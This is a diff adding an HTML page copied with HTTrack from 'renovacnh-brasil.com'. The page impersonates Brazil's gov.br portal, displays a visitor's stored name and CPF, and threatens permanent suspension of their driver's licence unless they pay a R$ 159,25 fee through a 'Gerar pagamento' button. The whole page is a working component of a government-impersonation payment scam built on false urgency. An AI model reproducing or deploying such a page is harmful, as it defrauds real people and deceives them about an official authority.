@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+  
+<!-- Mirrored from renovacnh-brasil.com/processo/pagamento.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 18 Nov 2024 21:05:10 GMT -->
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>gov.br | Regularize-se</title>
+
+    <link
+      rel="shortcut icon"
+      href="images/favicon.ico"
+      type="image/x-icon"
+    />
+    <!-- TailwindCSS CDN with custom font configuration -->
+    <link rel="stylesheet" href="style.css" />
+    <script src="https://cdn.tailwindcss.com/"></script>
+
+    <!-- JS Script -->
+    <script defer src="script.js"></script>
+    <script>
+
+        document.addEventListener('DOMContentLoaded', function () {
+          tryLoadData();
+        });
+
+        function tryLoadData() {
+            let cpf = localStorage.getItem("cpf")
+            let name = localStorage.getItem("name");
+            if (cpf) {
+              if (!isValidCPF(cpf)) {
+                window.location.href = "index.html";
+                return false;
+              }
+              
+              document.querySelector('.name').innerText = name;
+              document.querySelector('.cpf').innerText = formatCPF(cpf);
+            }
+        }
+
+    </script>
+  </head>
+  <body>
+    <header class="flex px-4 bg-white h-16 items-center drop-shadow-md">
+      <a href="index.html">
+        <img
+          src="images/png/govbr-logo-large.png"
+          alt="gov.br"
+        />
+      </a>
+    </header>
+    <main
+      class="flex flex-col text-center h-full gap-2 mt-10 rounded-md bg-white shadow-md w-96 py-2 mx-auto lg:w-1/4"
+    >
+      <div class="bg-blue-500 rounded-t-md py-3 px-6 text-white">
+        <h1>
+          IMPORTANTE: o não pagamento da taxa até o prazo determinado,
+          ocasionará na <span class="underline">SUSPENSÃO DEFINITIVA</span> da sua CNH! APÓS
+          EFETUAR O PAGAMENTO PERMANEÇA NESTA TELA!
+        </h1>
+      </div>
+
+      <div class="px-10 pt-4">
+        <div class="flex w-full justify-between">
+          <p class="text-sm font-bold">NOME:</p>
+          <p class="text-sm font-bold name"></p>
+        </div>
+        <div class="flex w-full justify-between">
+          <p class="text-sm font-bold">CPF:</p>
+          <p class="text-sm font-bold cpf"></p>
+        </div>
+        <div class="flex w-full justify-between mt-5">
+          <h3 class="font-bold">Taxa:</h3>
+          <span class="font-bold font-bold">R$ 159,25</span>
+        </div>
+
+        <button
+        id="gerar-pagamento"
+          class="bg-[#1351b4] text-sm font-bold text-white py-3 rounded-full mt-10 uppercase w-full lg:w-1/2 mx-auto mb-10"
+        >
+          Gerar pagamento
+        </button>
+      </div>
+    </main>
+  </body>
+
+<!-- Mirrored from renovacnh-brasil.com/processo/pagamento.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 18 Nov 2024 21:05:10 GMT -->
+</html>
